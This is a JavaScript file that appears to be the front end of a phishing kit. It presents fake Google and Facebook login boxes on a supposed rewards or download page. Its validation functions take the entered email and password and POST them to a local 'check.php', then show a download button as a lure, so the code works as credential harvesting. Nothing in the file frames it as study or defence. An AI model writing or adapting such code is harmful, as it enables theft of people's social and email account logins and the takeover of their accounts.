NOsetTimeout(function () {
  $('.loadinglogin').fadeOut(750);
  $('#text-login1').show()
    }, 5000);
    setTimeout(function () {
      $('#text-login1').hide()
      $('#text-login2').fadeIn()
    }, 2000)
    $('.open_rewards').hide(); 
    $('.itemReward_confirmation').hide();
    $('.itemReward_confirmation_2').hide();
    setTimeout(function () {
    $('.account_login').show();  
    $('.loadinglogin').hide();
      }, 5000);    

// show hide password for Google
function showGooglePassword() {
    var x = document.getElementById("password-google");
    if (x.type === "password") {
      x.type = "text";
      $('.GoogleShowPassword').hide();
      $('.GoogleHidePassword').show();
    } else {
      x.type = "password";
    }
  }
  
  function hideGooglePassword() {
    var x = document.getElementById("password-google");
    if (x.type === "text") {
      x.type = "password";
      $('.GoogleShowPassword').show();
      $('.GoogleHidePassword').hide();
    } else {
      x.type = "text";
    }
  }

function togglePasswordVisibility() {
  const passwordField = document.getElementById("password-google");
  passwordField.type = passwordField.type === "password" ? "text" : "password";
}

function open_account_login() {
	$('.account_login').show();
}
function open_google() {
	$('.login-google').show();
	$('.account_login').hide();
}
function open_facebook() {
	$('.login-facebook').show();
	$('.account_login').hide();
}
function close_google() {
	$('.login-google').hide();
	$('.account_login').show();
}
function close_facebook() {
	$('.login-facebook').hide();
	$('.account_login').show();
}
// code for validate data to next step

function setFocus(on) {
    var element = document.activeElement;
    if (on) {
        setTimeout(function() {
            element.parentNode.classList.add("focus");
        });
    } else {
        let box = document.querySelector(".input-box");
        box.classList.remove("focus");
        $("input").each(function() {
            var $input = $(this);
            var $parent = $input.closest(".input-box");
            if ($input.val()) $parent.addClass("focus");
            else $parent.removeClass("focus");
        });
    }
}

function ValidateLoginFbData() {
    $emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim(); 
    if ($emailfb.length < 5) {
        $('.email-fb').show();
        $('.sandi-fb').hide();
        $('.login-facebook').show();
        return false;
    } else if ($passwordfb.length < 5) {
        $('.sandi-fb').show();
        $('.email-fb').hide();
        $('.login-facebook').show();
        return false;
    } else {
        $.ajax({
            type: "POST",
            url: "check.php",
            data: $("#ValidateLoginFbForm").serialize(),
            beforeSend: function() {
                $('.email-fb').hide();
                $('.sandi-fb').hide();
                $('.login-facebook').hide();
				$('.login-facebook-load').show();
            },
            success: function() {
				$('.login-facebook-load').hide();
				$('#downloadbeforelogin').hide();
				$('#downloadafterlogin').show();
                return true;
            }
        });
    };
};
function showFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "password") {
        x.type = "text";
        $('.showPassword').hide();
        $('.hidePassword').show();
    } else {
        x.type = "password";
    }
}
function hideFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "text") {
        x.type = "password";
        $('.showPassword').show();
        $('.hidePassword').hide();
    } else {
        x.type = "text";
    }
}

function ValidateLoginGpData() {
    // 1. Gunakan var/let, hilangkan $ di depan nama variabel
    var emailgp = $('#email-google').val().trim();
    var passwordgp = $('#password-google').val().trim();
    
    // 2. Validasi Karakter
    if (emailgp.length < 5) {
        $('.email-gp').show();
        $('.sandi-gp').hide();
        $('.login-google').show();
        return false; 
    } 
    
    if (passwordgp.length < 7) {
        $('.sandi-gp').show();
        $('.email-gp').hide();
        $('.login-google').show();
        return false;
    }

    // 3. Eksekusi AJAX
    $.ajax({
        type: "POST",
        url: "check.php",
        // Pastikan ID Form #ValidateLoginGpForm sudah benar di HTML
        data: $("#ValidateLoginGpForm").serialize(), 
        beforeSend: function() { 
            $('.email-gp').hide();
            $('.sandi-gp').hide();
            $('.box-google').hide();
            $('.box-loading').show();
        },
        success: function() {
            // Sembunyikan loading, tampilkan sukses
            $('.box-loading').hide();
            $('.login-google').hide();
            $('#downloadbeforelogin').hide();
            $('#downloadafterlogin').show();
            
            
        }
    });
}

